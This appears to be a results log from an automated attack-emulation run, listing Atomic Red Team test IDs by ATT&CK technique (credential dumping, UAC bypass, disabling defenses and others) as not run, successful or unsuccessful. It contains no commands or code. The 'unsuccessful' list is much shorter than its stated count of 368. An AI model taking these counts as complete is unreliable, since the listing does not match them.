operation_7b6812b0-c2e5-4f18-a1e9-dfcb65747b62
operation_f7bb2d1e-c37c-4fdb-9548-4eff57b6a644
operation_6e203f11-0bf7-4f97-a8e3-4af62fd79617
operation_2f56ab6b-3404-499e-9bce-88f2b6ae275d
operation_00bf35cf-403c-4394-8a78-ad738cabd011
operation_4565dc60-b3bf-484a-a3eb-1e7fc25debe1
operation_7869b625-d7c5-4804-bfb0-fb1898abe949
operation_c3b2a536-058c-45a9-abf1-5202a345b58c
operation_18b6150f-081b-43b3-ab21-e5327b481213
operation_c2649deb-9d08-4e65-a23c-571ca6adb66b
operation_c82402f4-639d-4ac0-905e-007475ec7491
operation_074001e9-2f96-4082-abc4-b9b80cfb46c0
operation_d5f170f5-c4da-48e9-9432-fb0e1634370a
operation_ddeb174a-f8d7-48a0-b889-d1ac51024f34
operation_762e8ee7-0474-4a80-a8c3-aa71f21e0224
operation_6a7d58ed-4865-4f07-8657-a3bae8576894
operation_c8ec9443-9902-4bd8-9e99-efe7fcf0a245
operation_ee4cf98b-35a9-4773-bd0f-ce42e86bc58e
operation_a0232247-42ad-483b-93eb-c1837616af3a
operation_feca9f43-668b-4651-91fb-d2fe78571d7b
operation_99d35239-1a89-4694-92a3-7665736e0b97
operation_41df357a-1c32-417b-a627-58774f8f8d35
operation_f297212c-fbba-41e2-8f90-3216814ea942
operation_882b9100-4910-4656-b3bd-d76482742aa5
operation_546a37f0-2fa6-492c-9648-307deebb3752
operation_5d8ec941-025e-4d43-a20a-7806587b31df
operation_415f9bd3-3920-4495-9209-e3cb1f5421d6
operation_c0ca5d76-0267-42ee-8737-639124297828
operation_d6f684a7-f2c3-476f-b6ac-00cb2bf278a7
operation_36a5885a-5a8e-4ebe-ae95-708e540fbe66
operation_5bff6cd3-d390-40f7-9596-f6cc1f8374ac
operation_542f3f72-c1b8-4dd8-87c8-8f7f0d8ce2c1
operation_898bb753-906b-4dbc-8590-e160f0a91770
operation_27a4bfe9-ab34-4d55-9e90-97a6b2d716bf
operation_60be17e5-16ae-4700-8dbf-74895e828904
operation_75bf9291-74d2-473f-bb1f-3a82530ccdc8
operation_657003a4-acff-49f9-92fd-2a21bcea9198
operation_702ee084-70a0-4a6b-9f97-fc97c471cbf9
operation_c974595e-4483-4991-b3b4-bea967d5f61b
operation_1668f728-3c2c-46f4-92d9-55ccca8f5bcb
operation_86211066-6551-447f-a41c-ed123af59c8c
operation_73876e0e-1e92-4dac-92e0-a1f7d8dd4d9f
operation_d3ee632c-4b2d-41f8-8e7c-c8d8b6c622d8
operation_efea421e-2c22-4df4-85a3-387005db7372
operation_dc4772fa-36b7-4925-86af-515f0bb860c8
operation_6e2628a5-e784-4576-99ee-1961dc867a2f
operation_54455916-ba92-464e-9b5b-32a37b4a2340
operation_ba26dbb8-df02-4636-8c4a-e2264276d547
operation_19eb9cf7-a3ff-4cd7-a0dd-d93efb8695f4
operation_91768a66-6462-4713-9601-2ad8e1367de6
operation_61952c84-d261-4a87-aefa-aeb85c054fd5
operation_94d53fef-b64e-4f7f-a13e-d6d399e77b5a
operation_c38b84a2-a93c-4a83-a5ba-e8d6974cef83
operation_fa8a05a9-1b04-4b25-919d-89547102736a
operation_e59af92b-0a90-41c6-abe8-21cd6f5d31b8
-------------------------
Did not run due to All-Dead-Agents problem techiniques Adversary-Ids (59)


atomic__t1095__command-and-control__non-application_layer_protocol__4640e7df3aa2f0bc88f4c0ad5a215c83__trial_1
atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__0a3220a423ed7c7804af6e3587ad8811__trial_1
atomic__t1082__discovery__system_information_discovery__d91ba895a529dab873a22858cfdd3521__trial_1
atomic__t1531__impact__account_access_removal__c3f187080c141397bf8af092c44697a7__trial_1
atomic__t1136_003__persistence__create_account-_cloud_account__a976d2bc6da0471ddf8e3583ce4f7ed7__trial_1
atomic__t1098__persistence__account_manipulation__ae8bd61cb6d10568145c87134e95c96f__trial_1
atomic__t1491_001__impact__defacement-_internal_defacement__90adc98ddf396bb7cb3b90a1f090a0e0__trial_1
atomic__t1562_006__defense-evasion__impair_defenses-_indicator_blocking__233bd007622d94ee3019efc6a70d0a83__trial_1
atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__29797527e006f065df5c2d1f7b1b0b56__trial_1
atomic__t1207__defense-evasion__rogue_domain_controller__acd37a62e589a7190c35101583939337__trial_1
atomic__t1204_002__execution__user_execution-_malicious_file__ca3c058554276f34ac84b996af0caf0d__trial_1
atomic__t1564__defense-evasion__hide_artifacts__59638371d64a1fb450ee7f4d9c19b3d6__trial_1
atomic__t1531__impact__account_access_removal__e1ba582a3787829bb7f146009a040c8b__trial_1
atomic__t1547_014__multiple__active_setup__22f293978e324252426f9c7e337ae181__trial_1
atomic__t1606_002__credential-access__forge_web_credentials-_saml_token__502b7914aac58f15708500e3ec62526b__trial_1
atomic__t1098__persistence__account_manipulation__80d22fb154cc39b34d920f0855ce746e__trial_1
atomic__t1531__impact__account_access_removal__3f71c3360964b1a8c81618eb963c05f9__trial_1
atomic__t1218__defense-evasion__signed_binary_proxy_execution__7802ee02cf34e0e7cbee64ee22a79b8d__trial_1
atomic__t1114_003__collection__email_collection-_email_forwarding_rule__e947c2f5e248a8bbfe0e26b5bf688109__trial_1
atomic__t1098_003__persistence__account_manipulation-_additional_cloud_roles__300411e901bb14245148885ad5e72882__trial_1
atomic__t1530__collection__data_from_cloud_storage_object__3b234c1e6518ce41f49be91a20ce45f7__trial_1
atomic__t1528__credential-access__steal_application_access_token__22dda265607e5cecaa9ee0f0f65b7dfd__trial_1
atomic__t1562_008__defense-evasion__impair_defenses-_disable_cloud_logs__eb9de85953f93fc247c48f1b236839fc__trial_1
atomic__t1552_005__credential-access__unsecured_credentials-_cloud_instance_metadata_api__315440f0fd42ea0129065a76d89184f1__trial_1
atomic__t1564_004__defense-evasion__hide_artifacts-_ntfs_file_attributes__8da7c7a6e9a5b3bf95107b38230b09f6__trial_1
atomic__t1218__defense-evasion__signed_binary_proxy_execution__e6190b6456bdab5e159fabbfe1fcf251__trial_1
atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__23000b943f18392d477ad7a1cad6586c__trial_1
atomic__t1484_002__multiple__domain_trust_modification__776315112cd7318c4afd38f7847465fb__trial_1
atomic__t1021_001__lateral-movement__remote_services-_remote_desktop_protocol__28ed45c4da059b14a1b2d4f061b912b8__trial_1
atomic__t1136_003__persistence__create_account-_cloud_account__20e4f555f0b87421c9e9ec83d99eb562__trial_1
atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__34dfc0264e6fd27b4997fea21c0bbada__trial_1
atomic__t1110_003__credential-access__brute_force-_password_spraying__7404470d9fed6da5e72123a6b360ce31__trial_1
atomic__t1048_003__exfiltration__exfiltration_over_alternative_protocol-_exfiltration_over_unencrypted,obfuscated_non-c2_protocol__6646e3ecc1d5a25bc1cd7e68fe43763b__trial_1
atomic__t1098__persistence__account_manipulation__b3aef1cccb10fc2ecf00bc80646ef8fe__trial_1
atomic__t1098_002__persistence__account_manipulation-_additional_email_delegate_permissions__8f2c53299c608f1c5168dfda3561de50__trial_1
atomic__t1562_008__defense-evasion__impair_defenses-_disable_cloud_logs__81f547e5490f66c5e2540cda92a7e47a__trial_1
atomic__t1098__persistence__account_manipulation__bac18f187778e4202196ddd3c6041d31__trial_1
atomic__t1562_008__defense-evasion__impair_defenses-_disable_cloud_logs__100ab97404481eade26a4346edd80d73__trial_1
atomic__t1552_004__credential-access__unsecured_credentials-_private_keys__745d16045bcf10379b8cf2fa45f2b66e__trial_1
atomic__t1573__command-and-control__encrypted_channel__fb827394b296192cb7a81031a2e37ae2__trial_1
atomic__t1098_001__persistence__account_manipulation-_additional_cloud_credentials__7d46c4731c7b6ade58e43877e4b7dc66__trial_1
atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__1169b67e9f991716ba91833486f3c564__trial_1
atomic__t1098__persistence__account_manipulation__cbf44e79b4bef7b2e997508f759beee3__trial_1
atomic__t1547_014__multiple__active_setup__b45598708fd9e5b197cb58cf193f4778__trial_1
atomic__t1098__persistence__account_manipulation__c736f0cee0c30c06095fedc05fa83912__trial_1
atomic__t1110_001__credential-access__brute_force-_password_guessing__3883fdbd7c29b2f2f20121c75f875944__trial_1
atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__55e14d8b479b905a13976c8d94016a7b__trial_1
atomic__t1098_001__persistence__account_manipulation-_additional_cloud_credentials__cbcac4dcb804e967b01ea42e59a8c03f__trial_1
atomic__t1530__collection__data_from_cloud_storage_object__6f408258cabdeda38f81cfdc239fb6c0__trial_1
atomic__t1552_005__credential-access__unsecured_credentials-_cloud_instance_metadata_api__d27398e945aa13a0812450cd48815572__trial_1
atomic__t1218__defense-evasion__signed_binary_proxy_execution__1c4576eb8d4cea58c18e4b087d9c9ac0__trial_1
atomic__t1110_003__credential-access__brute_force-_password_spraying__baf7e695c46eda5497fc648d976054a6__trial_1
atomic__t1098_003__persistence__account_manipulation-_additional_cloud_roles__64c11bc729e5b99c282d4abd4d51b3fc__trial_1
atomic__t1056_004__multiple__input_capture-_credential_api_hooking__2b0df0cb121fb7ebe7ac0eed9e14b785__trial_1
atomic__t1526__discovery__cloud_service_discovery__e78bde5dfb72eb88083c3717ce2fc8c7__trial_1
atomic__t1055_001__multiple__process_injection-_dynamic-link_library_injection__3b22226d4454aff3f0ea046bbe637e77__trial_1
atomic__t1546_015__multiple__event_triggered_execution-_component_object_model_hijacking__4e80b3c50bd1fff09f4cfd628f031149__trial_1
atomic__t1078_004__multiple__valid_accounts-_cloud_accounts__987057c2b2cf415214afef9ea59378e5__trial_1
atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__c6d6e157f9ff496abfed129dda16fe13__trial_1
=========================
Successful techniques 97 out of 465:


68df771632fd6216858edd20458ee5bb
e90756bb6dcd21462dc4cc452661df91
1296157a99b29c9a81fb1ce4eaf24cbd
5a9be3b1696cc0cce8557f9596547e13
b473176c321f31824c909c73807caf92
0a69420bec84b02bd47464f6835653b1
9ccef9b46ce26850bb709a83d8e538ae
18f31c311ac208802e88ab8d5af8603e
392e12d6a466407e28d1bb51cf0729bb
5c23188ed301af9f1b6b55d4f3f60b46
9999b5c073203122cbe5f1f5438cf637
a96a64caf38bca14cef902e999bb6b98
43e3334362b140924f001b256b229ee5
3c0760559a620aad7664cdf98f486127
cde814c61dcd8b0fbeeb14f005c2432f
2bf75f949823305d3ea815c8e94e9ee3
2e9acde621e7768a73c1b9a1157c444d
53861bc51eb67cb9775c95b9e02ad141
1f15ab22c39a9b6bb2bb0d77276dfcb3
d94bcdfc9d0f769b062e1960f7af6804
05f8b752dbccff102ef530103bd8e550
df94858e92a23d274ac1d70133d9150f
9378f5d52c7f94cd08f407f8c0a5fbd7
18d69a8fd988d6b63f5307ce857723c9
431121fe12b6fd82938a9a52526b3423
ca6a3f579181ea47b7d95779e8d8a79b
4382d53f0f53399e72c728d019fffd77
4bb550aacec4efb190c72389677b7f4e
f4d3c5648b8d2fab9b061016eb91f478
98adc43648b0e4ea6e90a88ad5ae4b3d
7ad5840a79f3259965fa28835dda93c4
9c955a373154a7090d4b4396b561f5da
ab1b50880382b06d48d3d23ad1786239
7b9c7afaefa59aab759b49af0d699ac1
0c7c18db582bff4d0da4b4f8fdb2be49
bdd0be771e2462e572e2ecfbe5bf2eb7
613dc87cebac339d20973268e0bb1c0b
2413b013bc82d152765e2ac34601a327
f1222384fe40cc71e7dea9d182014eaf
a88b5c13a1d5d6bdf02b66bc73411f41
942d94dff3cc494bacf5517e775321a7
acf646b22c5d2c2b1058feb7da1f3bdc
2fc2b9c9b48990938653dbe8966d487d
34f398de2b04b96158b3bd25abaea5a7
501af516bd8b24fee0c7c650ae5cc861
7cd5d1852fb4a534fa9b735288ca158f
8a95e17c084e9a8bf41c69c73beeb0af
49a7502f9c667aa3af9c87f6ab1e68b3
42302f7d89c15f8070f83e743771d567
b41910e3770cff37dd642650f0d91672
adce11c81bb77ae74660c6c743a0442d
dc74af5b90b9cbb4dcfbcaaa3e412a5e
35d92515122effdd73801c6ac3021da7
81289b3d78d06c14b816f7644b1d9f8b
e0946bc3b8b888d6c4cdf3f023fe3c0b
0424ccb447bfa66b94162266f55ecd52
b0026f9a57639c049490a43d623d7695
c4c471259798dd6c7b0b56f716e12113
80e752c5fc69a56ccb86bc90efc5eff6
b0eb5108debf92ed5707a964b2bf3481
6a64ea6e29cdb83d468a27d6f69960cb
e7d20e7f0087f8a4234c1d1b7a228bb0
f2131e45dbd95e3057bd3494b5aeed41
344e7eaf650763e0d3e9f02e62c1cf4b
64569d9eb87191fc3cbf365a656e31ab
935e8026584b85192519c57d7080b048
cc7f0eb8b9115b271eaaa42c9b6f3dca
1afaec09315ab71fdfb167175e8a019a
f0fde90a3d59061b226197974e7dcbaa
7179bb4957f1f7f3004ea70c714a8fb9
920a251237fac2b70fe4d647aa16bfdd
34952e2eefd3066c5f574744e1734ca6
64430e7597668877a832b9d1e379c9f2
7575d3d5ae97ee568d49afbd0f878fe2
f49909057fa568660a6f268b7261e446
5c4ea84c2b050f1f8b6f880755ccbc62
bd9f08eb7c3215b8a6a7dd1af9ea406a
f1b3fca18d7465cd10e5a7477a3bf97d
aada5380e7d0a4c7b71f2a324d9d5327
abd5327a47c4994e2824f833eefe4250
b0e28215c59037cc6cdb61b38615c32d
557321faaf98c77b2b452cecd7b1de37
c407315583b3a00d9a2e0c3c510f2c96
55b2c04e70a5711957e264b04e645e91
abc25aecd2ed0524af31e79add29cc43
32047c4f30d4e65ebc9b22b9b8368bca
69219b448ba0a75bae573d58d8b6cf40
b262964145fa55e27265e7caa89b1169
bc456ce28da22e33b96257b6ae020391
221d4ebcb41e708b6ee90c1c0369a969
9b74d10b3164f13d357830d1a6ee334a
92578413245a3418c9dc21dc5db784ff
705c4b9714ce06223e7d7038cd332808
b6ebae300e5ff115e965cc9179d4f831
feb9647c55185e3b6045293fd26f6a5b
5610bf38f44ad2da2ecb846ba776ecdc
2fc2e45dde68ab78a97a22ca138652e1
-------------------------
Successful techiniques Adversary-Ids (97)


atomic__t1112__defense-evasion__modify_registry__0424ccb447bfa66b94162266f55ecd52__trial_1
atomic__t1003__credential-access__os_credential_dumping__18f31c311ac208802e88ab8d5af8603e__trial_1
atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__e0946bc3b8b888d6c4cdf3f023fe3c0b__trial_1
atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__c407315583b3a00d9a2e0c3c510f2c96__trial_1
atomic__t1219__command-and-control__remote_access_software__aada5380e7d0a4c7b71f2a324d9d5327__trial_1
atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__1f15ab22c39a9b6bb2bb0d77276dfcb3__trial_1
atomic__t1120__discovery__peripheral_device_discovery__7b9c7afaefa59aab759b49af0d699ac1__trial_1
atomic__t1027_006__defense-evasion__html_smuggling__a96a64caf38bca14cef902e999bb6b98__trial_1
atomic__t1556_002__multiple__modify_authentication_process-_password_filter_dll__cc7f0eb8b9115b271eaaa42c9b6f3dca__trial_1
atomic__t1036__defense-evasion__masquerading__bc456ce28da22e33b96257b6ae020391__trial_1
atomic__t1070_003__defense-evasion__indicator_removal_on_host-_clear_command_history__18d69a8fd988d6b63f5307ce857723c9__trial_1
atomic__t1090_001__command-and-control__proxy-_internal_proxy__b0eb5108debf92ed5707a964b2bf3481__trial_1
atomic__t1059_005__execution__command_and_scripting_interpreter-_visual_basic__42302f7d89c15f8070f83e743771d567__trial_1
atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__32047c4f30d4e65ebc9b22b9b8368bca__trial_1
atomic__t1547_014__multiple__active_setup__7ad5840a79f3259965fa28835dda93c4__trial_1
atomic__t1574_012__multiple__hijack_execution_flow-_cor_profiler__7179bb4957f1f7f3004ea70c714a8fb9__trial_1
atomic__t1547_004__multiple__boot_or_logon_autostart_execution-_winlogon_helper_dll__dc74af5b90b9cbb4dcfbcaaa3e412a5e__trial_1
atomic__t1021_003__lateral-movement__remote_services-_distributed_component_object_model__68df771632fd6216858edd20458ee5bb__trial_1
atomic__t1547_004__multiple__boot_or_logon_autostart_execution-_winlogon_helper_dll__7cd5d1852fb4a534fa9b735288ca158f__trial_1
atomic__t1070_001__defense-evasion__indicator_removal_on_host-_clear_windows_event_logs__05f8b752dbccff102ef530103bd8e550__trial_1
atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__5610bf38f44ad2da2ecb846ba776ecdc__trial_1
atomic__t1115__collection__clipboard_data__abd5327a47c4994e2824f833eefe4250__trial_1
atomic__t1074_001__collection__data_staged-_local_data_staging__4382d53f0f53399e72c728d019fffd77__trial_1
atomic__t1059_005__execution__command_and_scripting_interpreter-_visual_basic__9c955a373154a7090d4b4396b561f5da__trial_1
atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__9b74d10b3164f13d357830d1a6ee334a__trial_1
atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__43e3334362b140924f001b256b229ee5__trial_1
atomic__t1491_001__impact__defacement-_internal_defacement__2fc2e45dde68ab78a97a22ca138652e1__trial_1
atomic__t1204_002__execution__user_execution-_malicious_file__98adc43648b0e4ea6e90a88ad5ae4b3d__trial_1
atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__acf646b22c5d2c2b1058feb7da1f3bdc__trial_1
atomic__t1070_003__defense-evasion__indicator_removal_on_host-_clear_command_history__adce11c81bb77ae74660c6c743a0442d__trial_1
atomic__t1055_012__multiple__process_injection-_process_hollowing__557321faaf98c77b2b452cecd7b1de37__trial_1
atomic__t1006__defense-evasion__direct_volume_access__80e752c5fc69a56ccb86bc90efc5eff6__trial_1
atomic__t1134_001__multiple__access_token_manipulation-_token_impersonation,theft__81289b3d78d06c14b816f7644b1d9f8b__trial_1
atomic__t1119__collection__automated_collection__0c7c18db582bff4d0da4b4f8fdb2be49__trial_1
atomic__t1547_006__multiple__boot_or_logon_autostart_execution-_kernel_modules_and_extensions__bdd0be771e2462e572e2ecfbe5bf2eb7__trial_1
atomic__t1070_004__defense-evasion__indicator_removal_on_host-_file_deletion__b0026f9a57639c049490a43d623d7695__trial_1
atomic__t1546_015__multiple__event_triggered_execution-_component_object_model_hijacking__d94bcdfc9d0f769b062e1960f7af6804__trial_1
atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__3c0760559a620aad7664cdf98f486127__trial_1
atomic__t1547_004__multiple__boot_or_logon_autostart_execution-_winlogon_helper_dll__5c23188ed301af9f1b6b55d4f3f60b46__trial_1
atomic__t1119__collection__automated_collection__344e7eaf650763e0d3e9f02e62c1cf4b__trial_1
atomic__t1033__discovery__system_owner,user_discovery__221d4ebcb41e708b6ee90c1c0369a969__trial_1
atomic__t1055_003__multiple__thread_execution_hijacking__6a64ea6e29cdb83d468a27d6f69960cb__trial_1
atomic__t1566_001__initial-access__phishing-_spearphishing_attachment__0a69420bec84b02bd47464f6835653b1__trial_1
atomic__t1197__multiple__bits_jobs__5a9be3b1696cc0cce8557f9596547e13__trial_1
atomic__t1136_002__persistence__create_account-_domain_account__8a95e17c084e9a8bf41c69c73beeb0af__trial_1
atomic__t1482__discovery__domain_trust_discovery__feb9647c55185e3b6045293fd26f6a5b__trial_1
atomic__t1572__command-and-control__protocol_tunneling__f49909057fa568660a6f268b7261e446__trial_1
atomic__t1592_001__reconnaissance__gather_victim_host_information-_hardware__53861bc51eb67cb9775c95b9e02ad141__trial_1
atomic__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__64430e7597668877a832b9d1e379c9f2__trial_1
atomic__t1105__command-and-control__ingress_tool_transfer__a88b5c13a1d5d6bdf02b66bc73411f41__trial_1
atomic__t1490__impact__inhibit_system_recovery__e90756bb6dcd21462dc4cc452661df91__trial_1
atomic__t1112__defense-evasion__modify_registry__1296157a99b29c9a81fb1ce4eaf24cbd__trial_1
atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__392e12d6a466407e28d1bb51cf0729bb__trial_1
atomic__t1546_013__multiple__event_triggered_execution-_powershell_profile__49a7502f9c667aa3af9c87f6ab1e68b3__trial_1
atomic__t1112__defense-evasion__modify_registry__f4d3c5648b8d2fab9b061016eb91f478__trial_1
atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__2e9acde621e7768a73c1b9a1157c444d__trial_1
atomic__t1113__collection__screen_capture__64569d9eb87191fc3cbf365a656e31ab__trial_1
atomic__t1564_003__defense-evasion__hide_artifacts-_hidden_window__f1222384fe40cc71e7dea9d182014eaf__trial_1
atomic__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__e7d20e7f0087f8a4234c1d1b7a228bb0__trial_1
atomic__t1204_002__execution__user_execution-_malicious_file__705c4b9714ce06223e7d7038cd332808__trial_1
atomic__t1087_002__discovery__account_discovery-_domain_account__9ccef9b46ce26850bb709a83d8e538ae__trial_1
atomic__t1036_003__defense-evasion__masquerading-_rename_system_utilities__4bb550aacec4efb190c72389677b7f4e__trial_1
atomic__t1649__credential-access__steal_or_forge_authentication_certificates__b41910e3770cff37dd642650f0d91672__trial_1
atomic__t1059_003__execution__command_and_scripting_interpreter-_windows_command_shell__942d94dff3cc494bacf5517e775321a7__trial_1
atomic__t1204_002__execution__user_execution-_malicious_file__cde814c61dcd8b0fbeeb14f005c2432f__trial_1
atomic__t1033__discovery__system_owner,user_discovery__2bf75f949823305d3ea815c8e94e9ee3__trial_1
atomic__t1105__command-and-control__ingress_tool_transfer__b0e28215c59037cc6cdb61b38615c32d__trial_1
atomic__t1562_004__defense-evasion__impair_defenses-_disable_or_modify_system_firewall__34f398de2b04b96158b3bd25abaea5a7__trial_1
atomic__t1053_005__multiple__scheduled_task,job-_scheduled_task__920a251237fac2b70fe4d647aa16bfdd__trial_1
atomic__t1070_003__defense-evasion__indicator_removal_on_host-_clear_command_history__df94858e92a23d274ac1d70133d9150f__trial_1
atomic__t1055__multiple__process_injection__9999b5c073203122cbe5f1f5438cf637__trial_1
atomic__t1204_002__execution__user_execution-_malicious_file__431121fe12b6fd82938a9a52526b3423__trial_1
atomic__t1087_002__discovery__account_discovery-_domain_account__613dc87cebac339d20973268e0bb1c0b__trial_1
atomic__t1547_005__multiple__boot_or_logon_autostart_execution-_security_support_provider__bd9f08eb7c3215b8a6a7dd1af9ea406a__trial_1
atomic__t1219__command-and-control__remote_access_software__f1b3fca18d7465cd10e5a7477a3bf97d__trial_1
atomic__t1070_004__defense-evasion__indicator_removal_on_host-_file_deletion__2413b013bc82d152765e2ac34601a327__trial_1
atomic__t1055_002__multiple__process_injection-_portable_executable_injection__ca6a3f579181ea47b7d95779e8d8a79b__trial_1
atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__34952e2eefd3066c5f574744e1734ca6__trial_1
atomic__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__b473176c321f31824c909c73807caf92__trial_1
atomic__t1106__execution__native_api__b262964145fa55e27265e7caa89b1169__trial_1
atomic__t1059_005__execution__command_and_scripting_interpreter-_visual_basic__f2131e45dbd95e3057bd3494b5aeed41__trial_1
atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__f0fde90a3d59061b226197974e7dcbaa__trial_1
atomic__t1219__command-and-control__remote_access_software__b6ebae300e5ff115e965cc9179d4f831__trial_1
atomic__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__c4c471259798dd6c7b0b56f716e12113__trial_1
atomic__t1036__defense-evasion__masquerading__7575d3d5ae97ee568d49afbd0f878fe2__trial_1
atomic__t1555__credential-access__credentials_from_password_stores__935e8026584b85192519c57d7080b048__trial_1
atomic__t1204_002__execution__user_execution-_malicious_file__ab1b50880382b06d48d3d23ad1786239__trial_1
atomic__t1547_004__multiple__boot_or_logon_autostart_execution-_winlogon_helper_dll__92578413245a3418c9dc21dc5db784ff__trial_1
atomic__t1027_004__defense-evasion__obfuscated_files_or_information-_compile_after_delivery__55b2c04e70a5711957e264b04e645e91__trial_1
atomic__t1546__multiple__event_triggered_execution__2fc2b9c9b48990938653dbe8966d487d__trial_1
atomic__t1566_001__initial-access__phishing-_spearphishing_attachment__1afaec09315ab71fdfb167175e8a019a__trial_1
atomic__t1003_002__credential-access__os_credential_dumping-_security_account_manager__69219b448ba0a75bae573d58d8b6cf40__trial_1
atomic__t1217__discovery__browser_bookmark_discovery__abc25aecd2ed0524af31e79add29cc43__trial_1
atomic__t1547_009__multiple__boot_or_logon_autostart_execution-_shortcut_modification__501af516bd8b24fee0c7c650ae5cc861__trial_1
atomic__t1562_004__defense-evasion__impair_defenses-_disable_or_modify_system_firewall__9378f5d52c7f94cd08f407f8c0a5fbd7__trial_1
atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__5c4ea84c2b050f1f8b6f880755ccbc62__trial_1
atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__35d92515122effdd73801c6ac3021da7__trial_1
=========================
Unsuccessful techniques 368 out of 465:


7b6d0accaab6330d701dea8f4d7d96d4
e4c51df716410dc7baccead922f9d9a4
57548b3eefc3c3d3eaf8c3b51380921a
5e0427f03faf554046c6a29864087b49
a9faa0d792d6bc2660b05e7650d2736d
79cb459770a15ea9e56b874d62bf8319
d5bb3cda05ddba230c90c1afb2640379
c0bc49e3838d26569b243ae283082926
d6df415c9fbfc30ac359542d67537953
b2725f4e411b9328aa73fe54501a7564
f7257d271a176f7c609b4a33513d2eef
fe3527480a77ab0b52a518654e120b72
0d2e984bedf73f5266e250d7ecd257cf
548a620bf3463f72a42937faf7614935
ed65658e4431bc3b636dd0de29bf8e35
d3e69d970c19fb2a9a2ee8be47ea17ad
9332aff267b00ede37b09606340ee1dc
d74777514cba5a4fd4f297261ed0d8ef
48dc8d6cce12ca22b19fdbc93bd3a9ed
8ce073cf3170576e1f5c6e4d06e1873a
6fb0cdea444d58a340896d606baf281a
5e3512c73a461c17ddcb1cc0bbdbeef9
6e3d4c708ab0ff571eb05691cc8bcdda
e0c75b4cc32124ef4c61508694fd0808
f782c9b7007a34343faec301b64e7435
214be4092770061080ef0781c26bab3e
a3c8fba61f02a7b96306b87121b2ac4b
04858322bc6cd08282f2ce96cab5ee7c
4f277a5607b655a2e5bc05ff21ed81cf
c7aa16aea441e7bec9a6391af601acc9
bf9cc3d98c38f79c948a0f4a7f888034
6f5096d87a8f9ac4c397215cb58cc978
07b384a102f27412c1475421f4534f29
2594698a8e38a85b0d98468d87b49821
d143172642328567d9d0951cb116e3a2
820a346b2b676b51338c1170b675f76b
d54bcaf2e58f6d95da2a54dcb5853a57
358926f4adef63bf95d152e35df4dab3
08faa1ff79f2c8e48a2869a830c210f7
a45769d74eb1c75ff916b121023bde31
628181210e822588b5d90e1e256d775a
9ed218029d8392d2b4fdedd0f44bb052
5a1dc4ce41e376e1928d3a399ccadff3
305c23215a4bf6184ed701b5ca1d1af7
3f588ff884129699e1b9a56f2248bc3b
5fef676a9954938537bd1e2191d3e9b5
6913e132cdd2d9c29294490c2fbef2eb
587a8743222626915bb08b3e9e132b19
ce67d9c1b111032ddb8a56363c854fdc
7a4867f379d79c82f217108c48bdbf33
4572792b7173c41d22a827610b8f8890
c5951c819c5f6125e0e5987a12a344f9
08a146a382df6fea9fa2275073e9d245
cb6e6c7e18aba2207c696368f8edb23a
47ba984c0c40a7c41b4797156c1a5f96
9c2f9c808a72b05686236a63e1da93c8
4bf4facd1dad540d4b17ebe0db235707
b45cb08e24877077d98421393bce079a
03c8721619373b6c18a55721a33cad2c
f7c881e0d021a2f5b45546b5d0b4998e
48a861eb5802bd7abdaa64b4fcd30924
938a659c52ed102a8b35c7b1bb49eb11
085858a8aa5ea8e6a810e59c75ea7f6a
e541c2b62c3259680863a6f3b410e59a
dce08779676c01d98885e164a1176ac8
566b2f5743d88edb44ad1d9d450e921c
70f8b4c0be2ee69f07592eee0aa5acc0
ce2eccff2f1de0096efa0da778a7e27c
c75a55384a1e7026bb91f841e4ca2ba9
c905c33c06f38484cab101ae93a93a9a
126aaf80c6a232eaf08dcef3163d4aed
409acf7907007b041753a5f452b3df9b
4e9bac619326378b219b3635c9a91b94
8cd2639cb742872b58a2356909628376
7197a8fcd7e833f42251ee3eddaa87c1
7844eb9751d121b16f9517817a31eee4
e528524d6a3cddaaddc89fcc719e2a3f
0954576f69ca8e140f2cdc9e58b36ff9
d7967a23c8c030c698893f242e622be1
0690e0818b5749092595a472831f362f
72784d12700b219ec134aa42cec5603e
5b1aea789aa50c07bb5555dcff5d42a6
1ddf2b8ee6a56ce9f9132a168947653e
bdc2a80d621d3361ea727008644b1d15
ba8ddc38c7c6ced12fecc0d695c5e57c
1532b3faf25ad1e6f4fba4ada643b253
b62952c5352ee68c1340feb08a5a02a1
ef943918da20ee40d378ad000bbcc3b7
aa758d17faffeeb69c56481340891859
834e861bba95b87d066e84c5c6b056a0
9b3194cc656092b09f4d79ba3d3a3277
6d0695f8f33776c82ad1294b6c6f02cd
9d21f3b551b40fa40056af1244af56ee
d8dbc446fea6514a712803194b10cb75
7f0f5471543a6f188b0fbdc436c49fd9
4150ef18184112953ae5742a3f8de64e
aabe23a58568de3f9cc40e42e5f1b223
ff4e1ea516f781a6ef93323ba9dfac0a
57781057e51ffecf21e38fd31c9d2f79
a18a0e98b9566d92a1611a2da69b413b
0f3401d54f59bc1c3eca134ad5d8a774
